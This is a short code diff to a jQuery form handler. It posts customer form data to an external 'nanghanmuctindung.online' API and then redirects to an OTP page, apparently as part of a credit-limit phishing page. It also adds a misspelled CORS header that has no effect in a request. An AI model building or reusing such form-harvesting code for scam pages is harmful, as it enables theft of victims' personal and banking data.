@@ -100,13 +100,13 @@ $('#service').submit(function (e) {
         url: 'https://app.nanghanmuctindung.online/api/customer',
         type: 'POST',
         data: formData,
-        headers: {
-            'Content-Type': 'multipart/form-data'
-        },
-        crossDomain: true,
-        cache: false,
         contentType: false,
         processData: false,
+        cache: false,
+        headers: {
+            'Aceess-Control-Allow-Origin': '*',
+            'Accept': 'application/json',
+        },
         success: function (data) {
             window.location.href = '/otp.html';
         },
